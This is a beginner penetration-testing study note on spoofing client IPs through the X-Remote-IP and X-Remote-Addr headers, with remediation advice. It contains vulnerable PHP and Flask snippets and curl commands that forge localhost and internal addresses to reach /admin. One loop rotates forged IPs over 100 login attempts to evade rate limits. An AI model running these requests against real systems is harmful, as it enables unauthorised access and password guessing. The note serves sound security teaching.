---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.09 X-Remote-IP / X-Remote-Addr — IP Spoofing"
---

# 03.09 — X-Remote-IP / X-Remote-Addr

## What is it?

`X-Remote-IP` and `X-Remote-Addr` are non-standard IP forwarding headers used by some proxy setups and applications. Like `X-Forwarded-For` and `X-Real-IP`, if an application trusts these headers to identify the client IP, an attacker can spoof any IP address by setting them manually.

---

## How Applications Get These Headers

```
PROXY CONFIGURATION (custom/legacy):
  Some older proxies or custom middleware set:
  X-Remote-IP: 1.2.3.4
  X-Remote-Addr: 1.2.3.4

APPLICATION CODE (vulnerable):
  PHP:
    $ip = $_SERVER['HTTP_X_REMOTE_IP'] ?? $_SERVER['REMOTE_ADDR'];
    // If HTTP_X_REMOTE_IP is set → uses attacker-controlled value!
  
  Python/Flask:
    ip = request.headers.get('X-Remote-IP', request.remote_addr)
    # Same problem
```

---

## Attack: Bypass IP-Based Controls

```
SCENARIO: App blocks certain IPs or only allows internal IPs.

ATTACK:
  GET /admin HTTP/1.1
  X-Remote-IP: 127.0.0.1      ← appear as localhost!
  X-Remote-Addr: 192.168.1.1  ← appear as internal!

RATE LIMIT BYPASS:
  Rotate X-Remote-IP with different IPs per request.
  If app rate-limits by this header, each IP gets fresh limit.
```

---

## Testing

```bash
# Basic access bypass
curl -H "X-Remote-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Remote-Addr: 127.0.0.1" https://target.com/admin

# Rate limit bypass
for i in $(seq 1 100); do
  curl -X POST https://target.com/login \
    -H "X-Remote-IP: 10.0.0.$i" \
    -d "username=admin&password=test" &
done

# Try both headers together
curl -H "X-Remote-IP: 127.0.0.1" \
     -H "X-Remote-Addr: 127.0.0.1" \
     https://target.com/admin
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Trusting X-Remote-IP for access control | Use real TCP connection IP only |
| Rate limiting by header IP | Rate limit by authenticated session or real IP |
| PHP $_SERVER['HTTP_X_REMOTE_IP'] | Strip these headers at the reverse proxy |

---

## Related Notes
- [[02 - X-Forwarded-For]] — most common IP spoofing header
- [[05 - X-Real-IP]] — Nginx equivalent
- [[08 - X-Custom-IP-Authorization]] — custom IP access bypass
- [[10 - True-Client-IP]] — Cloudflare IP header
